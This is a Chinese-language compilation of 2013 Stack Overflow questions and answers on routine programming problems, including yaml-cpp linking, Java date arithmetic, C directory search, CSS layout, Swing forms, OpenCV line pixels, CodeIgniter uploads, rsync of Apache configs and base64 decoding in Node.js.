# yaml-cpp - 在 ROS 中使用 yaml-cpp 时出错？

> ID：15825103
> 
> 赞同：2
> 
> 时间：2013-04-05T02:52:18.930
> 
> 标签：yaml-cpp, ros

我正在尝试使用 yaml-cpp，根据[wiki](http://www.ros.org/wiki/yaml_cpp)，它是系统依赖项，因此我们甚至不需要更改 CMakelists.txt 或 manifest.xml。但是，当我编译代码时，我仍然会收到如下错误：

```
/home/aramus/fuerte_workspace/sandbox/image_test/src/image_test.cpp:53: undefined reference to `YAML::Parser::Parser(std::basic_istream<char, std::char_traits<char> >&)'
/home/aramus/fuerte_workspace/sandbox/image_test/src/image_test.cpp:54: undefined reference to `YAML::Node::Node()'
/home/aramus/fuerte_workspace/sandbox/image_test/src/image_test.cpp:92: undefined reference to `YAML::Node::~Node()'
/home/aramus/fuerte_workspace/sandbox/image_test/src/image_test.cpp:92: undefined reference to `YAML::Parser::~Parser()'
/home/aramus/fuerte_workspace/sandbox/image_test/src/image_test.cpp:92: undefined reference to `YAML::Node::~Node()'
/home/aramus/fuerte_workspace/sandbox/image_test/src/image_test.cpp:92: undefined reference to `YAML::Parser::~Parser()'
/home/aramus/fuerte_workspace/sandbox/image_test/src/image_test.cpp:92: undefined reference to `YAML::Node::~Node()'
/home/aramus/fuerte_workspace/sandbox/image_test/src/image_test.cpp:92: undefined reference to `YAML::Parser::~Parser()' 
```

我添加到 CMakeLists.txt 的唯一代码是：

```
target_link_libraries(${PROJECT_NAME} yaml-cpp)
rosbuild_add_executable(image_test src/image_test.cpp) 
```

我在 Linux 中使用 fuerte。任何解决方案有人吗？

编辑：我找到了我的解决方案！我更改了我的 CMakeLists.txt 以先构建可执行文件，然后添加 yaml-cpp 库！

```
rosbuild_add_executable(image_test src/image_test.cpp)
target_link_libraries(image_test yaml-cpp) 
```

我的 CMakeLists.txt 中的这两行工作正常！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-05T03:11:55.540

这些是链接器错误。确保您链接到库并包括其标题。从您提供的链接看来，在您的`CMakeLists.txt`文件中，您需要：

```
target_link_libraries(${PROJECT_NAME} yaml-cpp) 
```

# java - 关于在当前日期添加天数

> ID：15825106
> 
> 赞同：2
> 
> 时间：2013-04-05T02:52:56.817
> 
> 标签：java, calendar

我是java世界的新手。我正在学习和探索java日历类，它是一个由工厂方法get instance()组成的抽象类。我试图增加或减少日期，例如在当前日期加上一天以获得明天的日期，减去一天以获得昨天的日期等。由于 Java 中的日期被维护为长毫秒值，有时程序员倾向于添加24 小时为一天。如果这一天落在夏令时区，这可能是错误的，一天可能是 23 或 25 小时。当您从日期中添加或减去天数时，日期的其他组成部分（例如月份和年份）必须滚动。

我的查询如下所示。在课堂上，我试图加减天数。请告知，这是正确的方法还是您会建议的其他更好的方法。

```
 //Using Calendar to increment and decrement days from date in Java
     Date today = new Date(); 
    System.out.println("Today is " + toddMMyy(today)); 
    Calendar cal = Calendar.getInstance(); //adding one day to current date cal.add(Calendar.DAY_OF_MONTH, 1); 
    Date tommrrow = cal.getTime(); 
    System.out.println("Tomorrow will be " + toddMMyy(tommrrow)); //substracting two day from date in Java
    cal.add(Calendar.DAY_OF_MONTH, -2); 
Date yesterday = cal.getTime(); System.out.println("Yesterday was " + MMyy(cal.getTime())); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:15:12.157

你是正确的。这就是我们使用 Date 毫秒算术时发生的情况

```
 SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm");
     Date d1 = df.parse("2013-03-30 12:00");
     Date d2 = new Date(d1.getTime() + 24 * 3600 * 1000);  // +24 hrs
     System.out.println(df.format(d2)); 
```

输出

```
2013-03-31 13:00 
```

# c - 在另一个目录中查找目录

> ID：15825112
> 
> 赞同：0
> 
> 时间：2013-04-05T02:53:54.283
> 
> 标签：c, directory

我需要在不同的目录中找到特定的目录，但是由于某种原因，我的代码在当前目录中找到了目录，但是当我开始在父目录中搜索特定的命名目录时，却找不到它

```
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
void print_dir(char *dir_n, char *file)
{
DIR *dir = opendir(dir_n);

struct dirent *Dirent;
struct stat stats;

while(1)
{
    Dirent = readdir( dir );
    if (Dirent == NULL)
    {
        break;
    }

        stat( Dirent->d_name, &stats );
        if ( S_ISDIR( stats.st_mode ))
        {
            if(strcmp(file ,Dirent->d_name) == 0  &&  S_ISDIR( stats.st_mode ) )
            {
                printf("found\n");
                break;

            }
        }
}
closedir(dir);
}
int main(int argc, const char * argv[])
{
  print_dir("..", "dirtest");
  return 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T05:00:42.130

您需要检查系统调用的返回状态，特别是`stat()`.

发生的事情是您读取了在`..`目录中找到的名称，但是当您调用 时`stat()`，您正在这样做`./name`而不是`../name`.

这段代码应该说明这一点：

```
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>

void print_dir(char *dir_n, char *file)
{
    DIR *dir = opendir(dir_n);

    if (dir == 0)
    {
        int errnum = errno;
        fprintf(stderr, "error: opendir(\"%s\") failed (%d: %s)\n", dir_n, errnum, strerror(errnum));
        exit(1);
    }

    struct dirent *Dirent;

    while ((Dirent = readdir(dir)) != 0)
    {
        struct stat stats;
        if (stat(Dirent->d_name, &stats) < 0)
        {
            int errnum = errno;
            fprintf(stderr, "error: failed to stat(\"%s\") (%d: %s)\n", Dirent->d_name, errnum, strerror(errnum));
        }
        else if (S_ISDIR(stats.st_mode))
        {
            if (strcmp(file, Dirent->d_name) == 0)
            {
                printf("found directory %s (inode = %ld)\n", Dirent->d_name, (long)stats.st_ino);
                break;
            }
            else
                printf("found directory %s - not a match for %s\n", Dirent->d_name, file);
        }
        else
        {
            printf("%s is not a directory\n", Dirent->d_name);
        }
    }
    closedir(dir);
}

int main(void)
{
    print_dir("..", "dirtest");
    return 0;
} 
```

`../dirtest`如果目录存在，这个简单的变体应该找到目录：

```
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>

void print_dir(char *dir_n, char *file)
{
    DIR *dir = opendir(dir_n);

    if (dir == 0)
    {
        int errnum = errno;
        fprintf(stderr, "error: opendir(\"%s\") failed (%d: %s)\n", dir_n, errnum, strerror(errnum));
        exit(1);
    }

    struct dirent *Dirent;

    while ((Dirent = readdir(dir)) != 0)
    {
        char fullname[1024];
        snprintf(fullname, sizeof(fullname), "%s/%s", dir_n, Dirent->d_name);
        struct stat stats;
        if (stat(fullname, &stats) < 0)
        {
            int errnum = errno;
            fprintf(stderr, "error: failed to stat(\"%s\") (%d: %s)\n", fullname, errnum, strerror(errnum));
        }
        else if (S_ISDIR(stats.st_mode))
        {
            if (strcmp(file, Dirent->d_name) == 0)
            {
                printf("found directory %s (%s) (inode = %ld)\n", Dirent->d_name, fullname, (long)stats.st_ino);
                break;
            }
            else
                printf("found directory %s - not a match for %s\n", fullname, file);
        }
        else
        {
            printf("%s is not a directory\n", fullname);
        }
    }
    closedir(dir);
}

int main(void)
{
    print_dir("..", "dirtest");
    return 0;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T03:00:58.847

我在我的计算机上对其进行了测试（并为此创建了目录 ../dirtest），它似乎工作正常。您确定您的目录已创建并且您在正确的位置进行搜索吗？

# html - 为什么“container1”没有显示？

> ID：15825116
> 
> 赞同：0
> 
> 时间：2013-04-05T02:54:17.747
> 
> 标签：html, css

我的 div (container1) 有问题，它没有显示在网页视图上，我还在我的级联样式表上进行了一些编辑并在谷歌中浏览，不幸的是仍然没有解决我的问题。

**见下文：**

**CSS**

```
* {
    margin: 0;
    padding: 0;
}
html {
    height: 100%;
}
header, nav, section, article, aside, footer {
    display: block;
}
body {
    font: 12px/18px Arial, Tahoma, Verdana, sans-serif;
    height: 100%;
}
a {
    color: blue;
    outline: none;
    text-decoration: underline;
}
a:hover {
    text-decoration: none;
}
p {
    margin: 0 0 18px
}
img {
    border: none;
}
input {
    vertical-align: middle;
}
#wrapper {
    width: 100%;
    min-width: 1000px;
    min-height: 100%;
    height: auto !important;
    height: 100%;
}

/* Header
-----------------------------------------------------------------------------
#header {
    height: 150px;
    background: #FFE680;
}
*/

/* Middle
-----------------------------------------------------------------------------*/
#content {

    padding: 0 0 200px;
    height: 550px
}

#container1 {
    -moz-column-count: 1;
    -moz-column-gap: 1px;
    -webkit-column-count: 1;
    -webkit-column-gap: 1px;
    column-count: 1;
    column-gap: 1px;
    z-index: 2;
    position: absolute;
    left:400px;
    top: -100px;
}

/* Footer
-----------------------------------------------------------------------------*/
#footer {
    margin: -100px auto 0;
    min-width: 1000px;
    height: 100px;
    background: #BFF08E;
    position: relative;
} 
```

**HTML**

```
<!DOCTYPE html>
<head>
<link rel="stylesheet" href="style.css" type="text/css" media="screen, projection" />
</head>

<body>  

    <div id="wrapper">

        <header id="header">
            <strong>Header:</strong> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras tortor. Praesent dictum, libero ut tempus dictum, neque eros elementum mauris, quis mollis arcu velit ac diam. Etiam neque. Quisque nec turpis. Aliquam arcu nulla, dictum et, lacinia a, mollis in, ante. Sed eu felis in elit tempor venenatis. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Ut ultricies porttitor purus. Proin non tellus at ligula fringilla tristique. Fusce vehicula quam. Curabitur vel tortor vitae pede imperdiet ultrices. Sed tortor.
        </header><!-- #header-->

        <div id="content">
            <strong>Content:</strong> Sed placerat accumsan ligula. Aliquam felis magna, congue quis, tempus eu, aliquam vitae, ante. Cras neque justo, ultrices at, rhoncus a, facilisis eget, nisl. Quisque vitae pede. Nam et augue. Sed a elit. Ut vel massa. Suspendisse nibh pede, ultrices vitae, ultrices nec, mollis non, nibh. In sit amet pede quis leo vulputate hendrerit. Cras laoreet leo et justo auctor condimentum. Integer id enim. Suspendisse egestas, dui ac egestas mollis, libero orci hendrerit lacus, et malesuada lorem neque ac libero. Morbi tempor pulvinar pede. Donec vel elit.
        </div><!-- #content-->

        <div id="container1">
        Sed placerat accumsan ligula. Aliquam felis magna, congue quis, tempus eu, aliquam vitae, ante. Cras neque justo, ultrices at, rhoncus a, facilisis eget, nisl. Quisque vitae pede. Nam et augue. Sed a elit. Ut vel massa. Suspendisse nibh pede, ultrices vitae, ultrices nec, mollis non, nibh.
        </div>
    </div><!-- #wrapper -->

    <footer id="footer">
        <strong>Footer:</strong> Mus elit Morbi mus enim lacus at quis Nam eget morbi. Et semper urna urna non at cursus dolor vestibulum neque enim. Tellus interdum at laoreet laoreet lacinia lacinia sed Quisque justo quis. Hendrerit scelerisque lorem elit orci tempor tincidunt enim Phasellus dignissim tincidunt. Nunc vel et Sed nisl Vestibulum odio montes Aliquam volutpat pellentesque. Ut pede sagittis et quis nunc gravida porttitor ligula.
    </footer><!-- #footer -->

</body> 
```

# html - CSS 垂直向下显示元素而不是水平垂直

> ID：15825118
> 
> 赞同：14
> 
> 时间：2013-04-05T02:54:40.803
> 
> 标签：html, css

我有包裹在 div 内的元素。元素在 div 内以水平方向显示。问题是，我不知道如何垂直向下显示元素。我做了一些研究，一个解决方案是使用垂直对齐，但它似乎不起作用。

这是我想要完成的一个例子

[http://s9.postimg.org/6i34jzazz/save.jpg](http://s9.postimg.org/6i34jzazz/save.jpg)

我的 CSS

```
 .container {height:500px; width: 700px; background-color:#00B358} 
```

我的 HTML

```
 <html>
  <head>
<meta charset="utf-8" />
<link rel="stylesheet" href="css/navigation.css">
  </head>

  <div class="container ">
  <img border="0" src="download.jpg" alt="Pulpit rock" width="304" height="228">
  <img border="0" src="1.jpg" alt="Pulpit rock" width="304" height="228">
  <img border="0" src="2.jpg" alt="Pulpit rock" width="304" height="228">
  </div> 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-05T03:01:34.757

我认为如果不重新组织标记，您将无法实现您想要做的事情。您可能必须将 div 放入列容器中（至少在 flexbox 被广泛使用之前！）。

### 快速示例：

HTML：

```
<div class="container">
    <div class="col-1">
        <img border="0" src="download.jpg" alt="Pulpit rock">
        <img border="0" src="1.jpg" alt="Pulpit rock">
    </div>
    <div class="col-2">
        <img border="0" src="1.jpg" alt="Pulpit rock">
    </div>
</div> 
```

CSS：

```
img {
    display: block;
}

.container > div {
    float: left;
} 
```

### 解释：

如果元素是内联的，自然流将彼此并排出现，直到需要换行为止。如果元素是块级的，它们将始终出现在前一个元素的下方。另一种选择是浮动元素，但如果有空间，它会再次出现在前一个元素旁边，而不是下方。

这就是为什么您必须调整标记以将您想要的元素在一条垂直线上组合在一起 - 然后将下一组浮动在它旁边。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T02:58:52.440

您需要将 div 中的图像设置为 display:block; 不确定下面这是否是“类”中“元素类型”的正确格式，但它应该为您指明正确的方向。

这会将图像放在另一个之下。

.box1 img {显示：块；}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T04:22:31.043

我做了一些研究，发现`column-count`如果你有一个现代浏览器，哪些是有效的

```
-moz-column-count
-webkit-column-count
column-count 
```

您可能想摆弄`column-count`，但它应该可以满足您的目的，并且您可能也想弄乱它`column-width`以实现所需的结果。

```
-moz-column-width
-webkit-column-width
column-width 
```

[jsFiddle 示例](http://jsfiddle.net/Class/7spZT/)

[支持列数的浏览器](http://www.quirksmode.org/css/columns/#t02)

[A List Apart：多列](http://alistapart.com/article/multicolumnlists)

您可能必须为旧浏览器实现 js/html 条件检查才能创建相同的效果

# java - JTextField 和 RMI Java 的 GUI 问题

> ID：15825120
> 
> 赞同：1
> 
> 时间：2013-04-05T02:54:47.900
> 
> 标签：java, swing, user-interface

我在使用带有 RMI 的表格时遇到了一个非常奇怪的问题。客户端是一个时间段预订系统的实现，我已经将它实现为一个表格。

我面临两个问题。第一个是在进行更改后导致表更新。一个解决方案似乎是

```
private void cleanUp() { 

    panel.removeAll();
    panel.setVisible(false);
    panel.revalidate();
    showTable();
} 
```

这似乎确实有效。（或者可能导致我的问题，我不确定）

我现在遇到的问题与调用实际预订的方法中的 JTextField 有关。

```
private JTextField txtClientname;

txtClientname = new JTextField();
txtClientname.setText("ClientName"); 
```

然后在确认按钮监听器中 -

```
callBookingSlot(buttonAction, txtClientname.getText()); 
```

真正奇怪的是，这最初是有效的，一次。通过工作，我的意思是将从 JTextField 中提取的正确值放入表中。第一次它会将用户输入的值输入到该字段中。任何后续操作，它只会放入字符串“ClientName”

有人有想法么？这个问题似乎与 RMI 无关，我在没有 RMI 的情况下尝试过，从文本字段中获取的值仍然表现相同。我知道我可能应该查看 fireTableUpdated 等，但如果这是容易修复的其中之一，那就太好了。

编辑 - 更多信息

```
import java.awt.EventQueue;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.ListSelectionModel;

public class StackOverFlowGUI {

private static JFrame frame;
private static JTable table;
private static JPanel panel;
private JTextField txtClientname;
private static JFrame bookingPopup = new JFrame();

public static void main(String[] args) {

    EventQueue.invokeLater(new Runnable() {
        public void run() {
            StackOverFlowGUI window = new StackOverFlowGUI();
            window.frame.setVisible(true);
        }
    });
}

public StackOverFlowGUI() {
    initialize();
}

private void initialize() {
    panel = new JPanel();
    frame = new JFrame();
    frame.setBounds(100, 100, 700, 751);
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    frame.getContentPane().setLayout(null);
    panel.setBounds(10, 11, 674, 576);

    frame.getContentPane().add(panel);
    showTable();
}

private void showTable() {

    table = new JTable();
    panel.add(table);
    panel.setVisible(true);
    table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
    table.setCellSelectionEnabled(true);
    showBookingPopup(2, 2);
}

private void showBookingPopup(int row, int col) {

    bookingPopup.setBounds(100, 100, 220, 185);
    bookingPopup.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    bookingPopup.getContentPane().setLayout(null);
    txtClientname = new JTextField();
    txtClientname.setText("ClientName");
    txtClientname.setBounds(10, 11, 184, 20);
    bookingPopup.getContentPane().add(txtClientname);
    txtClientname.setColumns(10);
    bookingPopup.setVisible(true);

    JPanel panel = new JPanel();
    panel.setBounds(10, 65, 184, 33);
    bookingPopup.getContentPane().add(panel);

    JButton btnSubmit = new JButton("Submit");
    btnSubmit.addActionListener(new ActionListener() {
        public void actionPerformed(ActionEvent e) {

            //Here - works first time 
            System.out.println(txtClientname.getText());
            //Continues to work if I don't call cleanUp - but then main window will not update
            cleanUp();
        }
    });
    btnSubmit.setBounds(10, 113, 89, 23);
    bookingPopup.getContentPane().add(btnSubmit);

}

private void cleanUp() {

    panel.removeAll();
    panel.setVisible(false);
    panel.revalidate();
    showTable();
} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:29:42.037

您发布的代码有几个主要问题，包括：

*   在应该使用实例字段的地方使用静态字段
*   使用空布局并`setBounds(...)`避免使用 Swing 布局管理器
*   在应该使用 JDialogs 的地方使用多个 JFrames
*   但最重要的是，不必要地重新创建变量和组件。如果您需要清除字段，请清除字段，但不要简单地丢弃它们。

例如：

```
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;

public class DataIntoTable extends JPanel {

   private static final String[] COL_NAMES = {"First Name", "LastName"};
   private DefaultTableModel model = new DefaultTableModel(COL_NAMES, 0);
   private JTable table = new JTable(model);
   private JTextField firstNameField = new JTextField(10);
   private JTextField lastNameField = new JTextField(10);
   private JPanel dialogPanel = new JPanel();

   public DataIntoTable(final JFrame frame) {
      setLayout(new BorderLayout());
      add(new JScrollPane(table));

      dialogPanel.add(new JLabel("First Name:"));
      dialogPanel.add(firstNameField);
      dialogPanel.add(new JLabel("Second Name:"));
      dialogPanel.add(lastNameField);

      dialogPanel.add(new JButton(new AbstractAction("Submit") {

         @Override
         public void actionPerformed(ActionEvent arg0) {
            String[] rowData = {firstNameField.getText(), lastNameField.getText()};
            model.addRow(rowData);
            firstNameField.setText("");
            lastNameField.setText("");
         }
      }));

      JDialog dialog = new JDialog(frame, "Enter Name", false);
      dialog.getContentPane().add(dialogPanel);
      dialog.pack();
      dialog.setLocationRelativeTo(null);
      dialog.setVisible(true);

   }

   private static void createAndShowGui() {
      JFrame frame = new JFrame("Data Into Table");
      DataIntoTable mainPanel = new DataIntoTable(frame);

      frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
      frame.getContentPane().add(mainPanel);
      frame.pack();
      frame.setLocationByPlatform(true);
      frame.setVisible(true);
   }

   public static void main(String[] args) {
      SwingUtilities.invokeLater(new Runnable() {
         public void run() {
            createAndShowGui();
         }
      });
   }
} 
```

# opencv - OPENCV - 像素数

> ID：15825124
> 
> 赞同：0
> 
> 时间：2013-04-05T02:55:06.120
> 
> 标签：opencv, drawing, pixel

我在openCV中加载图像。然后我从 Point(x1,y1) 到 Point(x2,y2) 画线。如何计算那条线上的像素？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T06:21:09.770

尝试使用

```
int cvInitLineIterator(const CvArr* image, CvPoint pt1, CvPoint pt2, CvLineIterator* line_iterator, int connectivity=8, int left_to_right=0) 
```

[你可以在这里](http://opencv.willowgarage.com/documentation/drawing_functions.html#initlineiterator)找到它的描述

"函数初始化线迭代器并返回两个端点之间的像素数。两个点都必须在图像内。初始化迭代器后，可以检索连接两个端点的光栅线上的所有点通过连续调用 CV_NEXT_LINE_POINT 点。使用 4-connected 或 8-connected Bresenham 算法逐个计算线上的点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-26T07:14:01.917

您可以使用 opencv 中提供的 Lineiterator

```
Point p1={x1,y1}; // point 1
Point p2={x2,y2}; // point 2
LineIterator lineIterator1(lineImg, p1, p2,8); 
```

一旦线迭代器被初始化然后找到线连接`p1 and p2`使用中存在的像素数

```
lineIterator1.count 
```

您可以为此线迭代器使用 4 或 8 连接。

您可以在下面的链接中找到线迭代器的描述。[http://docs.opencv.org/modules/core/doc/drawing_functions.html#LineIterator](http://docs.opencv.org/modules/core/doc/drawing_functions.html#LineIterator)

# c# - 怎么不用安装Adobe Acrobat软件就可以注册Acrobat.dll

> ID：15825129
> 
> 赞同：0
> 
> 时间：2013-04-05T02:55:28.613
> 
> 标签：c#, .net

```
Acrobat.CAcroPDDoc pdfDoc = (Acrobat.CAcroPDDoc)Microsoft.VisualBasic.Interaction.CreateObject("AcroExch.PDDoc", ""); 
```

在 .net 中我想使用`acrobat.dll`但不想安装整个 Adob​​e Acrobat 软件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T03:56:42.313

acrobat.dll 是 COM 还是 COM+ 并且您必须向 GAC 注册？如果没有，那就搞砸吧！！！我猜你想将你的应用程序部署到服务器上，但你不想在服务器上安装 Adob​​e Acrobat 阅读器，对吧？如果正确，只需将 dll 嵌入到您的包中并部署到服务器。

# php - 有空输入 type="file" 时返回 false $this->form_validation->run()

> ID：15825131
> 
> 赞同：0
> 
> 时间：2013-04-05T02:55:36.810
> 
> 标签：php, jquery, css, html, codeigniter

每次我更新我的设置并将输入 type="file" 留空。$this->form_validation->run() 总是返回 false。我什至没有使用 setrules 并且需要它。

这是我的代码：

```
public function update_settings()
{
    $this->load->model('bus_owner_model');

    $data = $this->bus_owner_model->get_business_data_id_by_row($this->session->userdata('id'));

    $this->load->library('form_validation');

    $this->form_validation->set_rules('business_name', 'Business Name', 'required|trim|xss_clean');
    $this->form_validation->set_rules('type_of_business', 'Type of Business', 'required|trim');
    $this->form_validation->set_rules('country', 'Country', 'required|trim');
    $this->form_validation->set_rules('address', 'Address', 'required|trim');
    $this->form_validation->set_rules('city', 'City', 'required|trim|alpha');
    $this->form_validation->set_rules('email_address', 'Email Address', 'required|trim|valid_email');
    $this->form_validation->set_rules('contact', 'Contact', 'required|trim|numeric|min_length[7]');
    $this->form_validation->set_message('is_unique', 'Your email address is already been taken');

    if($this->form_validation->run() == true)
    {
        $config['upload_path']      = "./_profile_images/";
        $config['allowed_types']    = 'jpg|jpeg|gif|png';
        $config['encrypt_name']     = "true";
        $this->load->library('upload', $config);    

        if(!$this->upload->do_upload())
        {

            $this->bus_settings($this->upload->display_errors());
        }else
        {
            $this->load->model('bus_owner_model');

            $file_data = $this->upload->data();

            $data = array(
                'company_name'      => $this->input->post('business_name'),
                'profile_img'       => $file_data['file_name'],
                'type_description'  => $this->input->post('type_of_business'),
                'country'           => $this->input->post('country'),
                'address'           => $this->input->post('address'),
                'state'             => $this->input->post('state'),
                'city'              => $this->input->post('city'),
                'email_address_c'   => $this->input->post('email_address'),
                'contact'           => $this->input->post('contact')
            );

            if($this->bus_owner_model->update_bus($data) == true)
            {
                redirect('bus_owner/bus_settings');
            }else
            {
                $this->load->model('bus_owner_model');
                $this->load->model('user_model');
                $data['latlng']                                     = $this->bus_owner_model->get_latlng();
                $data['get_all_business_data_orderby_total_result'] = $this->bus_owner_model->get_all_business_data_orderby_total();
                $data['get_all_user_data_orderby_total_result']     = $this->user_model->get_all_user_data_orderby_total();
                $data['result_countries']                           = $this->bus_owner_model->get_countries();
                $data['get_business_data_result']                   = $this->bus_owner_model->get_business_data();

                $data = array('error' => 'unable to upload files');
                $this->load->view('site_header', $data);
                $this->load->view('bus_owner_views/left_col_map_single');
                $this->load->view('left_col_static', $data);
                $this->load->view('bus_owner_views/right_col_settings', $data);
                $this->load->view('site_footer');               
            }           
        }                       
    }
} 
```

然后它会返回到它的页面并且什么都没有发生。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:01:29.490

I think you are trying to upload file and apply normal field validation on it.That's the wrong way you are trying to validate.Because file field have different behaviour than normal input field.Try this way only for file field.

```
public function update_settings()
{
   $config['upload_path'] = './uploads/';
        $config['allowed_types'] = 'gif|jpg|png';
        $config['max_size'] = '100';
        $config['max_width']  = '1024';
        $config['max_height']  = '768';

        $this->load->library('upload', $config);

        if ( ! $this->upload->do_upload())
        {
            $error = array('error' => $this->upload->display_errors());

             redirect('bus_owner/bus_settings');
        }
        else
        {
            $data = array('upload_data' => $this->upload->data());

            $this->load->view('upload_success', $data);
        }
}. 
```

For more details goto [link](http://ellislab.com/codeigniter/user-guide/libraries/file_uploading.html).

# android - 我正在尝试读取 android 上的文件

> ID：15825132
> 
> 赞同：0
> 
> 时间：2013-04-05T02:55:43.950
> 
> 标签：android, button, text, file-io, textview

我正在制作一个应用程序，其中按钮的文本是随机字符串，所有随机字符串都存储在 .txt 文件中。我创建了一个返回字符串的方法，由于某种原因，每当我运行应用程序时，按钮都是空白的，并且上面没有文本。我知道这与文件 io 有关系，因为如果我得到返回一个像“hi”这样的集合字符串的方法，那么按钮上的文本将是 hi。我正在添加我的 oncreate 方法以防万一。

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_game);

    String str = "Hello there!";
    TextView text = (TextView) findViewById(R.id.question);
    text.setText(execute());

} 
```

上面是我的 oncreate 下面是我的 fileio 文件

```
public static String execute() {
 String number[] = new String[100];
 double x = Math.random()*47;
 int random = (int) Math.round(x);

    int act = 0;

    //The try/catch statement encloses some code and is used to handle errors and exceptions that might occur
    try { 

        // Read in a file
        BufferedReader in = new BufferedReader(new FileReader("activities")); 

        String str; 
        while ((str = in.readLine()) != null) { 
            number[act] = str;
            act++;
        } 
        in.close();
        } catch (IOException e) { 
            System.out.println("Can not open or write to the file.");
        } 

    return number[random];
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T03:00:13.173

您已经提到您尝试从`.txt`文件中读取，但在 中`FileReader`，您只给出了一个`activities`没有任何文件扩展名的名称。这就是为什么什么都没有显示的原因。

```
new FileReader("activities.txt"); // Should be something like this 
```

此外，它要么需要是相对的，`URL`要么甚至更好，尝试将您的文件放入文件`assets`夹中，然后尝试从那里读取它。这是一种更好、更清洁的方法。

查看有关如何从文件夹中读取文件的[答案。](https://stackoverflow.com/a/9544781/2024761)`assets`

# ubuntu - Ubuntu 12.10 将虚拟主机从一台服务器复制到另一台服务器

> ID：15825135
> 
> 赞同：0
> 
> 时间：2013-04-05T02:55:48.750
> 
> 标签：ubuntu, amazon-ec2, ubuntu-12.10

我想从一台服务器复制我的可用站点和启用站点的文件夹并将它们移动到我的新服务器，而无需再次将它们全部输入。有没有快速的方法来做到这一点？也许我可以将它们复制到我的桌面，然后再复制回新服务器？我不知道使这项工作的命令。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T02:58:14.893

你能用`rsync`吗？

在服务器 1 上：

```
rsync -aP /etc/apache2/sites-available you@<ip_of_server2>:/etc/apache2/sites-available 
```

# string - Node.js 无法解码字符串.. 字符乱码（问号）

> ID：15825141
> 
> 赞同：1
> 
> 时间：2013-04-05T02:56:43.287
> 
> 标签：string, node.js, encoding, utf-8, base64

我真的希望这能正常工作，但是......

我在标题中得到一个 base64 字符串......我想将它编码为 UTF8。

```
strInit = req.headers['authorization']
buf = new Buffer(strInit.length)
i = 0

while i < strInit.length
  buf[i] = strInit.charCodeAt(i)
  i++    
str = buf.toString()
str2 = new Buffer(str, 'base64').toString()
console.log("AUTH REQUEST :",strInit, buf, str, str2)

AUTH REQUEST : Basic dXNlckBnbWFpbC5jb206cXdlcnR5 
<Buffer 42 61 73 69 63 20 64 58 4e 6c 63 6b 42 6e 62 57 46 70 62 43 35 6a 
62 32 30 36 63 58 64 6c 63 6e 52 35> Basic dXNlckBnbWFpbC5jb206cXdlcnR5 
�"q�͕������������ݕ�� 
```

我尝试在线解码它并按预期显示（user@gmail.com:qwerty）

例如这里它工作正常：[http ://www.base64decode.org](http://www.base64decode.org)

我错过了什么？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:13:30.600

已解决：好的，实际上我找到了......我必须从字符串中删除“Basic”，这样解码器就不会混淆......

所以解决方案就是：

```
new Buffer(req.headers['authorization'].replace("Basic ",""),"base64").toString() 
```

这样就可以了。

# jquery - 外部 jQuery 函数内部的 HTML 不起作用

> ID：15825142
> 
> 赞同：0
> 
> 时间：2013-04-05T02:56:43.537
> 
> 标签：jquery, html, href

我有一个外部 javascript 文件，可以在我的 html 页面上的 div 中加载 HTML：

```
$(window).load(function(){
$('img#madhere').click(function(e) {
    e.preventDefault();
  $('#extras').html('<ul class="animated flash"><li class="drop"><a id="infobutton" class="scroll" href="#bottomcontent"></a><div class="dropdownContain"><div class="dropOut"><ul><li><a id="show_madhere_info" href="">Info</a></li><li><a id="show_madhere_credits" href="">Credits</a></li><li><a id="show_madhere_trivia" href="">Trivia</a></li><li><a class="twits" href="https://twitter.com/share?text=Check%20out%20%22Were%20All%20Mad%20Here%22%20on%20Jick%20Pictures&url=http%3A%2F%2Fwww.jickpictures.com" target="_blank">Twitter</a></li><li><a class="facebooker" href="https://www.facebook.com/dialog/feed?app_id=19884028963&ref=share_popup&link=http%3A%2F%2Fvimeo.com%2F58261368&redirect_uri=http%3A%2F%2Fvimeo.com%2F58261368%3Fclose" target="_blank">Facebook</a></li><li><a class="tuber" href="http://youtu.be/TFht5BGvoLU" target="_blank">YouTube</a></li><li><a class="vimeos" href="https://vimeo.com/58261368" target="_blank">Vimeo</a></li><li><a class="reddits" href="http://www.reddit.com/submit" onclick="window.location = "http://www.reddit.com/submit?url=" + encodeURIComponent(window.location); return false" target="_blank">Reddit</a></li></ul></div></div></li></ul>');  
  });
}); 
```

